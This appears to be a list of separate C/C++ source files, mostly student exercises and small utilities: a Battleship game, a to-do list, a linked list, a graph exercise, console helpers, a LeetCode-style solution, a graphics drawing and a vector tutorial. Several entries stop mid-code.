    "/**\n*\n* Solution to course project # 1\n* Introduction to programming course\n* Faculty of Mathematics and Informatics of Sofia University\n* Winter semester 2023/2024\n*\n* @author Antonio Todorov Gatovski\n* @idnumber 6MI0600280\n* @compiler VC\n*\n* <File with game functions>\n*\n*/\n\n#include <iostream>\n#include <fstream>\n#include <windows.h>\n#include <random>\n\nconst unsigned WIN = 16;\n\n// Constraint for input validation\nconst unsigned MAX_STRING_SIZE = 2;\nconst unsigned MAX_SIZE = 100;\n\n// Constants for ship sizes\nconst unsigned AIRCRAFT_CARRIER_SIZE = 5;\nconst unsigned BATTLESHIP_SIZE = 4;\nconst unsigned CRUISER_SIZE = 3;\nconst unsigned DESTROYER_SIZE = 2;\n\n// Constants for ship letters\nconst char AIRCRAFT_CARRIER_LETTER = 'A'; \nconst char BATTLESHIP_LETTER = 'B';\nconst char CRUISER_LETTER = 'C';\nconst char DESTROYER_LETTER = 'D';\n\n// Constants for board space\nconst char EMPTY_SPACE = '*';\nconst char HIT_MARKER = '~';\n\n// Constants for player and computer\nconst char PLAYER = 'P';\nconst char COMPUTER = 'C';\n\n// Global variable which helps save the current state of the game or restart it\nchar RESTART_OPTION;\n\nunsigned getStringLength(char* stringInput) {\n\n    if (stringInput == nullptr) {\n        return 0;\n    }\n\n    unsigned length = 0;\n\n    while (*stringInput!='\\0')\n    {\n        length++;\n        stringInput++;\n    }\n\n    return length;\n}\n\nunsigned convertCharToUnsigned(char* stringInput) {\n\n    if (stringInput == nullptr) {\n        return 0;\n    }\n\n    unsigned length = getStringLength(stringInput);\n\n    if (length == 1) {\n        return (stringInput[length-1] - '0');\n    }\n\n    else return stringInput[length-1] - '0' + 10;\n}\n   \nvoid printStartMenu() {\n\n    std::cout << \"Welcome to Battleships!\" << std::endl;\n    std::cout << std::endl;\n    std::cout << \"Choose game style\" << std::endl;\n    std::cout << std::endl;\n    std::cout << \"Press p for PVP\" << std::endl;\n    std::cout << \"Press c for PVC\" << std::endl;\n\n}\n\nvoid clearConsole() {  \n    system(\"cls\");\n}\n\nchar saveAndContinue(char gameSave) {\n    \n    clearConsole();\n\n    if (gameSave == 's' || gameSave == 'S') {\n        // Save game state (you can implement saving logic here)\n        std::cout << \"Game state saved.\" << std::endl;\n\n        // Prompt user for continuation or restart\n        std::cout << \"Press c to continue or r to restart the game...\" << std::endl;\n        do\n        {\n            std::cin >> gameSave;\n\n            if ((gameSave != 'c' && gameSave != 'C') && (gameSave != 'r' && gameSave != 'R')) {\n                std::cout << \"Incorrect input!\" << std::endl;\n                std::cout << \"Only valid commands are c and r! Try again!\" << std::endl;\n\n            }\n\n        } while ((gameSave != 'c' && gameSave != 'C') && (gameSave != 'r' && gameSave != 'R'));\n\n        return gameSave;\n    }\n\n    return gameSave;\n\n}\n\nvoid printBoard(char** playerBoard, unsigned boardSize) {\n\n    for (unsigned i = 0; i < boardSize; i++)\n    {\n        for (unsigned j = 0; j < boardSize; j++)\n        {\n            std::cout << playerBoard[i][j] << ' ';;\n        }\n        std::cout << std::endl;\n    }\n\n}\n\nbool checkValidCoordinates(char** playerBoard, unsigned boardSize, int indexStartingRow, int indexStartingColumn, char shipLetter, char direction) {\n    int shipSize;\n\n    // Set ship size based on ship letter\n    switch (shipLetter) {\n    case AIRCRAFT_CARRIER_LETTER:\n        shipSize = AIRCRAFT_CARRIER_SIZE;\n        break;\n    case BATTLESHIP_LETTER:\n        shipSize = BATTLESHIP_SIZE;\n        break;\n    case CRUISER_LETTER:\n        shipSize = CRUISER_SIZE;\n        break;\n    case DESTROYER_LETTER:\n        shipSize = DESTROYER_SIZE;\n        break;\n    default:\n        return false; // Invalid ship letter\n    }\n\n    // Check if indexes are in the boundaries\n    if (indexStartingRow < 1 || indexStartingRow > boardSize || indexStartingColumn < 1 || indexStartingColumn > boardSize) {\n        return false;\n    }\n\n    // Check direction of positioning\n    for (int i = 0; i < shipSize; ++i) {\n        int row = direction == 'v' || direction == 'V' ? indexStartingRow + i : indexStartingRow;\n        int col = direction == 'h' || direction == 'H' ? indexStartingColumn + i : indexStartingColumn;\n\n        // Check if ship fits in the boundaries\n        if (row < 1 || row > boardSize || col < 1 || col > boardSize) {\n            return false;\n        }\n\n        // Check if there is free space for the ship\n        if (playerBoard[row][col] != '*') {\n            return false;\n        }\n    }\n\n    return true;\n}\n\nbool checkValidShootingCoordinates(char** playerBoard, unsigned boardSize, int indexRow, int indexColumn) {\n\n    if (indexRow<1 || indexRow>=boardSize) return false;\n\n    if (indexColumn<1 || indexColumn>=boardSize) return false;\n\n    return true;\n\n}\n\nvoid loadMatrixPlayer(char** playerBoard, unsigned boardSize) {\n\n    playerBoard[0] = new char[boardSize];\n    playerBoard[0][0] = ' ';\n\n    for (unsigned i = 1; i < boardSize; i++)\n    {\n        playerBoard[0][i] = i - 1 ",
    "#include<iostream>\r\n#include<windows.h>\r\nusing namespace std;\r\nvoid print_tasks(string tasks[], int task_count){\r\n    cout<<\"Tasks to Do: \"<<endl;\r\n    for(int i=0;i<task_count;i++){\r\n        cout<<\"Task \"<<i<<\" : \"<<tasks[i]<<endl;\r\n    }\r\n    cout<<\"-------------------------------------\"<<endl;\r\n}\r\nint main(){\r\n    string tasks[10]={\"\"};\r\n    int task_count=0;\r\n    int option=-1;\r\n    while(option !=0)\r\n    {\r\n        cout<<\"--TO DO LIST--\"<<endl;\r\n        cout<<\"1 - To Add New Task\"<<endl;\r\n        cout<<\"2 - To View New Task\"<<endl;\r\n        cout<<\"3 - Delete the Task\"<<endl;\r\n        cout<<\"0 - Terminate the Program\"<<endl;\r\n        cin>>option;\r\n        \r\n        switch(option){\r\n            case 1:\r\n            {\r\n                if(task_count>9){\r\n                    cout<<\"```TASK LIST IS FULL```\"<<endl;\r\n                }\r\n                else{\r\n                    cout<<\"Enter a New Task: \";\r\n                    cin.ignore();\r\n                    getline(cin,tasks[task_count]);\r\n                    task_count++;\r\n                }\r\n                break;\r\n            }\r\n            case 2:\r\n            system(\"cls\");\r\n                print_tasks(tasks,task_count);\r\n                break;\r\n            case 3:\r\n            {\r\n                system(\"cls\");\r\n                print_tasks(tasks,task_count);\r\n                int del_task=0;\r\n                cout<<\"Enter A tasks to delete: \";\r\n                cin>>del_task;\r\n\r\n                if(del_task<0 || del_task>9){\r\n                    cout<<\"You Entered Invalid Task No.\"<<endl;\r\n                    break;\r\n                }\r\n                for(int i=del_task; i<task_count;i++){\r\n                    tasks[i]=tasks[i+1];\r\n                }\r\n                task_count=task_count-1;\r\n                break;\r\n            }\r\n            case 0:\r\n                cout<<\"Terminating the Program-----  ---  ---- --  ---\"<<endl;\r\n                break;\r\n            default:\r\n                cout<<\"You entered Invalid Value!\"<<endl;\r\n\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n",
    "#include<bits/stdc++.h>\nusing namespace std;\nclass Node {\n    public:\n    int val;\n    Node * next;\n    Node * prev;\n    Node (int val){\n        this->val =val;\n        this->next= NULL;\n        this->prev = NULL;\n    }\n};\nvoid print_normal(Node * head)\n{\n    Node *tmp = head;\n    while (tmp != NULL)\n    {\n        cout << tmp->val << \" \";\n        tmp = tmp->next; \n    }\n    cout << endl;\n    \n}\nvoid print_reverse(Node *tail)\n{\n    Node * tmp = tail;\n    while (tmp != NULL)\n    {\n        cout << tmp->val;\n        tmp = tmp->prev;\n\n    }\n    cout << endl;\n}\nint size(Node * head){\n    int count = 0;\n    Node * tmp = head;\n    while (tmp != NULL)\n    {\n        count ++;\n        tmp = tmp->next;\n    }\n    return count;\n}\nvoid insert_at_position(Node * head, int pos, int v){\n    Node * tmp = head;\n    Node * newNode = new Node(v);\n    for (int i = 0; i < pos -1; i++)\n    {\n        tmp = tmp->next;\n    }\n    newNode->next = tmp->next;\n    tmp->next = newNode;\n    newNode->next->prev= newNode;\n    newNode->prev = tmp;\n    \n}\nvoid insert_head(Node * &head, Node *& tail, int val ){\n    Node * newNode = new Node(val);\n\n    if (head == NULL)\n    {\n        head = newNode;\n        tail = newNode;\n        return;\n    }\n    newNode->next= head;\n    head->prev= newNode;\n    head = newNode;\n    \n}\nvoid insert_tail(Node *& head, Node *& tail, int val){\n    Node * newNode = new Node(val);\n    if (tail == NULL)\n    {\n        head = newNode;\n        tail = newNode;\n        return;\n    }\n    tail->next = newNode;\n    newNode->prev= tail;\n    tail = newNode;\n    \n}\nint main()\n{\n    Node * head = new Node(10);\n    Node * a = new Node(20);\n    Node * b = new Node(30);\n    Node * tail = b;\n    head->next=a;\n    a->prev = head;\n    a->next = b;\n    b->prev = a;\n    int pos, val;\n    cin>> pos>> val;\n// cout<< size(head);\n// cout<< pos;\nif (pos > size(head))\n{\n    cout << \"Invalid\" << endl;\n}\nelse if (pos == 0)\n{\n    insert_head(head, tail, val);\n}\nelse if (pos == size(head))\n{\n    insert_tail(head, tail, val);\n}\n\nelse\n{\n    insert_at_position(head, pos, val);\n}\n\n\n    print_normal(head);\n    // print_reverse(tail);\n    return 0;\n}\n",
    "#ifndef __PROGTEST__\n#include <cassert>\n#include <cstdint>\n#include <iostream>\n#include <memory>\n#include <limits>\n#include <optional>\n#include <algorithm>\n#include <bitset>\n#include <list>\n#include <array>\n#include <vector>\n#include <deque>\n#include <set>\n#include <map>\n#include <unordered_set>\n#include <unordered_map>\n#include <stack>\n#include <queue>\n#include <random>\n\n#include <stdio.h>\n#include <sys/resource.h>\n\ntemplate < typename F, typename S >\nstruct std::hash<std::pair<F, S>> {\n  std::size_t operator () (const std::pair<F, S> &p) const noexcept {\n    // something like boost::combine would be much better\n    return std::hash<F>()(p.first) ^ (std::hash<S>()(p.second) << 1);\n  }\n};\n\n// For exposition only. In the tests Place will not\n// be a string but some other type. This type will always\n// be comparable, hashable and it will have default and\n// copy constructors.\nusing Place = std::string;\nusing Connection = std::pair<Place, Place>;\n\nstruct Map {\n  std::vector<Place> places;\n  std::vector<Connection> connections;\n};\n\n#endif\n\nstruct TrafficNetworkTester {\n  explicit TrafficNetworkTester(const Map&);\n  std::map<size_t, size_t> index;\n  std::vector<std::set<size_t>> new_dsts;\n  std::vector<long long int> scc;\n  // Count how many areas exist in the network\n  // after adding conns.\n  // Note that conns may introduce new places.\n  unsigned count_areas(const std::vector<Connection>& conns) const;\n};\n\n\n\nvoid transverse(const std::vector<std::set<size_t>>& dsts, std::vector<std::set<size_t>>& transverse_graph){\n  for(size_t i=0; i<dsts.size(); i++){\n    for (auto j=dsts.at(i).begin(); j!=dsts.at(i).end(); j++){\n      transverse_graph.at(*j).insert(i);\n    }\n  }\n}\n\n// void dfs(int v, std::stack<size_t>& z, std::vector<uint8_t>& explored, const std::vector<std::set<size_t>>& transverse_graph){\n//   if(explored.at(v)!=0){\n//     return;\n//   }\n//   explored.at(v)=1;\n//   for(auto i=transverse_graph.at(v).begin(); i!=transverse_graph.at(v).end(); i++){\n//     dfs((*i), z, explored, transverse_graph);\n//   }\n//   explored.at(v)=2;\n//   z.push(v);\n// }\nstruct for_dfs\n{\n  u_int8_t color;\n  size_t pi;\n  size_t d;\n  size_t right;\n  size_t index;\n};\n\nvoid dfs(size_t v, std::deque<size_t>& z, std::vector<for_dfs>& str_dfs, const std::vector<std::set<size_t>>& dsts){\n  using namespace std;\n  \n  u_int8_t step;\n  size_t index;\n\n  for(size_t i=0; i<dsts.size(); i++){\n    str_dfs.at(i).color=0;\n    str_dfs.at(i).pi=SIZE_MAX;\n  }\n  size_t time=0;\n  stack<tuple<size_t, u_int8_t, size_t>> s;\n  for(size_t u=0; u<dsts.size(); u++){\n    if(str_dfs.at(u).color==0){\n      // open;\n      step =1;\n      index=0;\n      while(true){\n        bool flag = false;\n        if (step==1){\n          str_dfs.at(u).color=1;\n          time=time+1;\n          str_dfs.at(u).d=time;\n          step =2;\n        }\n        if (step==2){\n          size_t i=0;\n          for(auto v=dsts.at(u).begin(); v!=dsts.at(u).end(); v++){\n            if (i>= index && str_dfs.at(*v).color==0){\n              str_dfs.at(*v).pi = u;\n              s.push({u, 2, i+1});\n              u=*v;\n              step =1;\n              index=0;\n              flag =true;\n              break;\n            }\n            i++;\n          }\n          if (flag == true){\n            continue;\n          }\n          step =3;\n        }\n        if (step ==3){\n          str_dfs.at(u).color=2;\n          z.push_back(u);\n          time = time+1;\n          str_dfs.at(u).right = time;\n          if(s.empty()==true){\n            break;\n          }\n          else {\n            auto tmp = s.top();\n            u = get<0>(tmp);\n            step = get<1>(tmp);\n            index = get<2>(tmp);\n            s.pop();\n          }\n        }\n      }\n    }\n  }\n\n  cout << flush;\n\n  // stack<size_t> s;\n  // s.push(v);\n  // explored.at(v)=1;\n  // while(s.empty() == false){\n  //   auto top = s.top();\n  //   if(explored.at(top)<2){\n  //     explored.at(top)=2;\n  //   } else{\n  //     s.pop();\n  //     z.push_back(top);\n  //     explored.at(top)=3;\n  //     continue;\n  //   }\n  //   for(auto i=dsts.at(top).begin(); i!=dsts.at(top).end(); i++){\n  //     if(explored.at(*i)<1){\n  //       s.push(*i);\n  //       explored.at(*i)=1;\n  //     }\n  //   }\n  // }\n}\n\n\nvoid dfs_graph(std::deque<size_t>& z, std::vector<uint8_t>& explored, const std::vector<std::set<size_t>>& transverse_graph){\n  using namespace std;\n  // stack<size_t> rec_stack;\n  // for(long unsigned int j=0; j<explored.size();j++){\n  //   if(explored.at(j)==0){\n  //     rec_stack.push(j);\n  //     while(rec_stack.empty()==false){\n  //       size_t rec_stack_top = rec_stack.top();\n  //       rec_stack.pop();\n  //       if(explored.at(rec_stack_top)==0){\n  //         explored.at(rec_stack_top) = explored.at(rec_stack_top)+1;\n  //         auto i= transverse_graph.at(rec_stack_top).begin();\n  //         if(i==transverse_graph.at(rec_stack_top).end()){\n  //           z.push_back(rec_stack_top);\n  //         }\n  //         while(i!=transverse_graph.at(rec_stack_top).end())",
    "// util.cpp: utility functions. printing to console, changing console color, etc.\n\n/* Copyright(C) 2024 tommojphillips\n *\n * This program is free software : you can redistribute it and /or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.If not, see < https://www.gnu.org/licenses/>.\n*/\n\n// Author: tommojphillips\n// GitHub: https:\\\\github.com\\tommojphillips\n\n// std incl\n#include <cstdarg>\n#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n#include <ctime>\n\n// user incl\n#include \"util.h\"\n#include \"type_defs.h\"\n#include \"xbmem.h\"\n\nstatic int console_util_color = 0;\n\nvoid setConsoleColor(const int col)\n{\n\tif (col != 0) // reset col.\n\t{\n\t\tconsole_util_color = 0;\n\t\tprintf(\"\\033[0m\");\n\t}\n\n\tif (col < 0) // don't set col if less than 0.\n\t{\n\t\treturn;\n\t}\n\n\t// set col.\n\tconsole_util_color = col;\n\tprintf(\"\\x1B[%dm\", col);\n}\nvoid printData(UCHAR* data, const int len, bool newLine)\n{\n    if (data == NULL)\n    {\n\t\terror(\"Error: data is NULL\\n\");\n\t\treturn;\n\t}\n    if (len <= 0)\n    {\n\t\terror(\"Error: len is less than or equal to 0\\n\");\n\t\treturn;\n\t}\n\n    for (int i = 0; i < len; i++)\n    {\n\t\tprint(\"%02X \", data[i]);\n\t}\n\n    if (newLine)\n    {\n\t\tprint(\"\\n\");\n\t}\n}\n\nvoid print_f(const char* format, ...)\n{\n\t// find {1}, {2}, etc and replace with the corresponding argument\n\tconst char START_TOKEN = '{';\n\tconst char END_TOKEN = '}';\n\tconst int BUF_SIZE = 8;\n\n\tchar msg[BUF_SIZE] = { 0 };\n\tint len = strlen(format);\n\n\tchar* p = (char*)format; // set pointer to the start of the format string\n\n\tchar* startToken = NULL;\n\tchar* endToken = NULL;\n\n\tchar* argPtr = NULL;\n\n\tint curIter = -1;\n\twhile (++curIter < BUF_SIZE - 1)\n\t{\n\t\tif (*p == '\\0')\n\t\t{\n\t\t\tbreak;\n\t\t}\n\n\t\tif (BUF_SIZE - 1 <= curIter)\n\t\t{\n\t\t\tbreak;\n\t\t}\n\n\t\t// check for token\n\t\tif (*p == START_TOKEN)\n\t\t{\n\t\t\tstartToken = p;\n\t\t\twhile (*p != END_TOKEN)\n\t\t\t{\n\t\t\t\tif (*p == '\\0')\n\t\t\t\t{\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t\tp++;\n\t\t\t}\n\n\t\t\tif (*p != END_TOKEN)\n\t\t\t{\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\tendToken = p;\n\n\t\t\t// replace token with argument\n\n\t\t\t// get the number between the tokens\n\t\t\tint num = 0;\n\t\t\tchar* token = startToken + 1;\n\t\t\tint tokenLen = endToken - token;\n\t\t\tchar tokenStr[10] = { \"\\0\" };\n\n\t\t\tstrncpy(tokenStr, token, tokenLen);\n\t\t\ttokenStr[9] = '\\0';\n\n\t\t\tnum = atoi(tokenStr);\n\n\t\t\t// get the argument based on the number\n\n\t\t\tchar* arg = NULL;\n\t\t\tint argLen = 0;\n\t\t\tva_list ap;\n\n\t\t\tif (argPtr == NULL)\n\t\t\t{\n\t\t\t\tva_start(ap, format);\n\t\t\t\tfor (int i = 0; i < num; ++i)\n\t\t\t\t{\n\t\t\t\t\tif (i == num - 1)\n\t\t\t\t\t{\n\t\t\t\t\t\targ = va_arg(ap, char*);\n\t\t\t\t\t\targLen = strlen(arg);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tva_end(ap);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\targ = argPtr;\n\t\t\t\targLen = strlen(arg);\n\t\t\t}\n\n\t\t\tif (argLen > 0)\n\t\t\t{\n\t\t\t\tif (argLen > BUF_SIZE - curIter - 1)\n\t\t\t\t{\n\t\t\t\t\targLen = BUF_SIZE - curIter - 1;\n\t\t\t\t\targPtr = arg + argLen;\n\t\t\t\t\tmsg[curIter] = '\\0';\n\t\t\t\t\tp = startToken - 1;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\targPtr = NULL;\n\t\t\t\t}\n\n\t\t\t\txb_cpy(msg + curIter, arg, argLen);\n\n\t\t\t\tcurIter += argLen;\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\t// copy the character\n\t\t\tmsg[curIter] = *p;\n\t\t}\n\n\t\t// move to the next character\n\t\tp++;\n\n\t\t// print the message\n\t\tprint(msg);\n\n\t\tif (*p == '\\0')\n\t\t{\n\t\t\tbreak;\n\t\t}\n\n\t\tcurIter = -1;\n\t\txb_zero(msg, BUF_SIZE);\n\t}\n}\n\nvoid format(char* buffer, const char* format, ...)\n{\n\tva_list args;\n\n\tva_start(args, format);\n\tvsprintf(buffer, format, args);\n\tva_end(args);\n}\n\nvoid print(const char* format, ...)\n{\n\tva_list args;\n\n\tva_start(args, format);\n\tvfprintf(stdout, format, args);\n\tva_end(args);\n}\n\nvoid error(const char* format, ...)\n{\n\tva_list args;\n\n\tva_start(args, format);\n\tvfprintf(stderr, format, args);\n\tva_end(args);\n}\n\nvoid setForegroundColor(const CON_COL col)\n{\n\tint con_col = col;\n\n\tif (col >= 0 && col < CON_COL::BLACK)\n\t{\n\t\tcon_col += 31;\n\t}\n\n\tsetConsoleColor((CON_COL)con_col);\n}\n\nvoid print(const CON_COL col, const char* format, ...)\n{\n\tsetForegroundColor(col);\n\n\tva_list args;\n\tva_start(args, format);\n\tvfprintf(stdout, format, args);\n\tva_end(args);\n\n\tsetConsoleColor(0);\n}\nvoid error(const CON_COL col, const char* format, ...)\n{\n\tsetForegroundColor(col);\n\n\tva_list args;\n\tva_start(args, format);\n\tvfprintf(stderr, format, args);\n\tva_end(args);\n\n\tsetConsoleColor(0);\n}\n\nint checkSize(const UINT& size)\n{\n\tswitch (size)\n\t{\n\t\tcase 0x40000U:\n\t\tcase 0x80000U:\n\t\tcase 0x100000U:\n\t\t\treturn 0;\n\t}\n\treturn 1;\n}\n\nvoid getTimestamp(unsigned int timestamp, char* timestamp_str)\n{\n\tif (timestamp_str == NULL)\n\t{\n\t\t//error(\"Error: timestamp_str is NULL\\n\");\n\t\treturn;\n\t}\n\ttime_t rawtime = (time_t)timestamp;\n\tstruct tm* ptm;\n\n\tptm = gmtime(&rawtime);\n\n\tchar* time_str = asctime(ptm);\n\ti",
    "#include <iostream>\r\n#include <vector>\r\n#include <cmath>\r\n\r\nint firstMissingPositive(std::vector<int> &nums)\r\n{\r\n    int n = nums.size();\r\n\r\n    // B\u01b0\u1edbc 1: Lo\u1ea1i b\u1ecf c\u00e1c s\u1ed1 kh\u00f4ng d\u01b0\u01a1ng v\u00e0 c\u00e1c s\u1ed1 l\u1edbn h\u01a1n n\r\n    for (int i = 0; i < n; ++i)\r\n    {\r\n        if (nums[i] <= 0 || nums[i] > n)\r\n        {\r\n            nums[i] = n + 1;\r\n        }\r\n    }\r\n\r\n    // B\u01b0\u1edbc 2: \u0110\u00e1nh d\u1ea5u c\u00e1c s\u1ed1 d\u01b0\u01a1ng b\u1eb1ng c\u00e1ch \u0111\u1ed5i d\u1ea5u c\u1ee7a ph\u1ea7n t\u1eed t\u01b0\u01a1ng \u1ee9ng\r\n    for (int i = 0; i < n; ++i)\r\n    {\r\n        int num = std::abs(nums[i]);\r\n        if (num <= n)\r\n        {\r\n            nums[num - 1] = -std::abs(nums[num - 1]);\r\n        }\r\n    }\r\n\r\n    // B\u01b0\u1edbc 3: T\u00ecm s\u1ed1 d\u01b0\u01a1ng nh\u1ecf nh\u1ea5t kh\u00f4ng xu\u1ea5t hi\u1ec7n\r\n    for (int i = 0; i < n; ++i)\r\n    {\r\n        if (nums[i] > 0)\r\n        {\r\n            return i + 1;\r\n        }\r\n    }\r\n\r\n    // N\u1ebfu t\u1ea5t c\u1ea3 c\u00e1c s\u1ed1 t\u1eeb 1 \u0111\u1ebfn n \u0111\u1ec1u xu\u1ea5t hi\u1ec7n\r\n    return n + 1;\r\n}\r\n\r\nint main()\r\n{\r\n    // Nh\u1eadn d\u1eef li\u1ec7u t\u1eeb ng\u01b0\u1eddi d\u00f9ng\r\n    std::vector<int> nums = {5, 8, 3, 2, 1};\r\n\r\n    // T\u00ednh to\u00e1n v\u00e0 in k\u1ebft qu\u1ea3\r\n    std::cout << \"First Missing Positive: \" << firstMissingPositive(nums) << std::endl;\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "#include<stdio.h>\r\n#include<graphics.h>\r\n#include<math.h>\r\n#include <dos.h>\r\n\r\n\r\nint main()\r\n{\r\n    int gd= DETECT, gm;\r\n    initgraph(&gd,&gm,(char*)\"\");\r\n\r\n    setcolor(DARKGRAY);\r\n    line(1,300,900,300); //roadsline1\r\n    line(1,400,900,400);  //roadsline2\r\n    line(1,305,900,305); //roadsline1...\r\n        line(1,405,900,405); //roadsline1..\r\n\r\n        //zebra crossing\r\n         rectangle(272,305,305,310);\r\n         rectangle(274,315,307,320);\r\n         rectangle(276,325,309,330);\r\n         rectangle(278,335,311,340);\r\n         rectangle(280,345,313,350);\r\n         rectangle(282,355,315,360);\r\n         rectangle(284,365,317,370);\r\n         rectangle(286,375,319,380);\r\n         rectangle(288,385,321,390);\r\n         rectangle(290,395,323,400);\r\n         floodfill(1,400, DARKGRAY);\r\n\r\n            //setcolor(BLUE);\r\n            line(1,150,50,150); //building1...\r\n            line(1,150,1,300); //building1\r\n                line(50,150,50,300); //building1\r\n                line(50,150,70,155); //building1\r\n                line(70,155,70,300); //building1 complete\r\n\r\n               rectangle(5,155,45,165); //window\r\n               rectangle(5,175,45,185); //window\r\n                rectangle(5,195,45,205); //window\r\n                rectangle(5,215,45,225); //window\r\n                rectangle(5,235,45,245);\r\n                rectangle(5,255,45,265);\r\n               rectangle(5,275,45,285);\r\n                //setfillstyle(SOLID_FILL,BLUE);\r\n                //floodfill(5, 150, BLUE);\r\n\r\n                //setcolor(GREEN);\r\n                //setfillstyle(11,GREEN);\r\n\r\n                line(60,100,110,100); //building2\r\n                line(60,100,60,152); //building2\r\n                line(110,100,115,105); //building2\r\n                line(110,100,110,300); //building2\r\n                line(115,105,115,300); //building2\r\n                //building 2 window\r\n                setcolor(DARKGRAY);\r\n                rectangle(65,110,105,125);\r\n                line(83,110,83,125); line(85,110,85,125);\r\n                 rectangle(65,135,105,150); line(83,135,83,150); line(85,135,85,150);\r\n                  rectangle(70,160,105,175); line(83,160,83,175); line(85,160,85,175);\r\n                   rectangle(70,185,105,200); line(83,185,83,200); line(85,185,85,200);\r\n                    rectangle(70,210,105,225); line(83,210,83,225); line(85,210,85,225);\r\n                    rectangle(70,235,105,250); line(83,235,83,250); line(85,235,85,250);\r\n                    rectangle(70,260,105,275); line(83,260,83,275); line(85,260,85,275);\r\n                      setfillstyle(SOLID_FILL, GREEN);\r\n                //floodfill(66,92,15);\r\n\r\n                setcolor(DARKGRAY);\r\n                //line(115,160,140,160); //shortbuilding3\r\n                //line(115,160,115,300); //shortbuilding3\r\n                //line(140,160,140,190); //shortbuilding3\r\n                setfillstyle(SOLID_FILL,DARKGRAY);\r\n\r\n                rectangle(118,190,190,300); //shortbuilding4\r\n                //line(190,190,118,190); //shortbuilding4\r\n                //line(190,190,190,300); //shortbuilding4\r\n                rectangle(123,200,185,300);//GREEN\r\n                rectangle(128,210,180,300);\r\n                rectangle(133,220,175,300);\r\n\r\n                //setcolor(9,BROWN);\r\n                rectangle(115,115,200,300);//pichoner building 5\r\n                setfillstyle(11,YELLOW);\r\n                rectangle(120,125,195,145); line(125,125,125,145); line(130,125,130,145); line(135,125,135,145); line(140,125,140,145); line(145,125,145,145); line(150,125,150,145); line(155,125,155,145); line(160,125,160,145); line(165,125,165,145); line(170,125,170,145); line(175,125,175,145); line(180,125,180,145); line(185,125,185,145); line(190,125,190,145);\r\n                rectangle(120,155,195,175);line(125,155,125,175); line(130,155,130,175); line(135,155,135,175); line(140,155,140,175); line(145,155,145,175); line(150,155,150,175); line(155,155,155,175); line(160,155,160,175); line(165,155,165,175); line(170,155,170,175); line(175,155,175,175); line(180,155,180,175); line(185,155,185,175); line(190,155,190,175);\r\n                //floodfill(120,125,15);\r\n\r\n                //setfillstyle(SOLID_FILL, BROWN);\r\n                //floodfill(115, 115, BROWN);\r\n\r\n                rectangle(200,98,270,300); //building6\r\n                // building 6 windows\r\n                rectangle(210,108,260,128);\r\n                rectangle(210,138,260,158);\r\n                rectangle(210,168,260,188);\r\n                rectangle(210,198,260,218);\r\n                rectangle(210,228,260,248);\r\n                rectangle(210,258,260,278);\r\n                rectangle(230,288,250,300);\r\n\r\n\r\n\r\n\r\n//building 7 windows\r\n                rectangle(305,160,330,180); //1\r\n                rectangle(340,160,365,180);// 2\r\n                rectangle(305,190,330,210);//1\r\n                rectangle(340,190,365,210);//2\r\n                rectangle(305,220,330,240);//1\r\n                rectangle(340,220,365,240);//2\r\n   ",
    "#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n    // declaration of vector\r\n    vector<int> v1;\r\n    // How to insert new elements\r\n    v1.push_back(3);\r\n    v1.emplace_back(6); // faster\r\n\r\n    // default creation\r\n    vector<int> v2(5, 100); // A vector containing five 100s\r\n    vector<int> v3(5);      // A vector Containing five 0s\r\n    // copy vector\r\n    vector<int> v4(v2);\r\n\r\n    // vector of pairs\r\n    vector<pair<int, int>> v5;\r\n    // difference in syntax\r\n    v5.push_back({2, 5});\r\n    v5.emplace_back(6, 7);\r\n\r\n    // HOw to acccess vector\r\n    vector<int> v6 = {3, 6, 7, 9, 8, 5};\r\n    cout << v6[0] << endl;\r\n    // Iterator\r\n    // v.begin()\r\n    vector<int>::iterator it1 = v6.begin();\r\n    cout << *(++it1) << endl;\r\n    // v.end()\r\n    it1 = v6.end();\r\n    cout << *(--it1) << endl;\r\n\r\n    // how to loop a vector\r\n    for (vector<int>::iterator i = v6.begin(); i != v6.end(); i++)\r\n    {\r\n        cout << *(i) << \" \";\r\n    }\r\n    cout << endl;\r\n    // auto\r\n    for (auto i = v6.begin(); i != v6.end(); i++)\r\n    {\r\n        cout << *(i) << \" \";\r\n    }\r\n    cout << endl;\r\n    // for each loop\r\n    for (auto i : v6)\r\n    {\r\n        cout << i << \" \";\r\n    }\r\n    cout << endl;\r\n\r\n    // how to erase elements from vector\r\n    // delete single element\r\n    v6.erase(v6.begin() + 1);\r\n    for (auto i : v6)\r\n    {\r\n        cout << i << \" \";\r\n    }\r\n    cout << endl;\r\n    // delete range of elemnets\r\n    v6.erase(v6.begin() + 1, v6.begin() + 4); //[start,end)\r\n    for (auto i : v6)\r\n    {\r\n        cout << i << \" \";\r\n    }\r\n    cout << endl;\r\n\r\n    // Insert Elements\r\n    vector<int> v7(5, 10);\r\n    // insert one\r\n    v7.insert(v7.begin(), 80);\r\n    // insert  multiple\r\n    v7.insert(v7.begin() + 1, 4, 70);\r\n    // one vector into another\r\n    vector<int> copy(2, 100);\r\n    v7.insert(v7.begin(), copy.begin(), copy.end());\r\n    v7.pop_back();\r\n    for (auto i : v7)\r\n    {\r\n        cout << i << \" \";\r\n    }\r\n    cout << endl;\r\n    // some other functions\r\n    cout << v7.size();\r\n    cout << endl;\r\n    cout << v7.empty();\r\n\r\n    return 0;\r\n}",
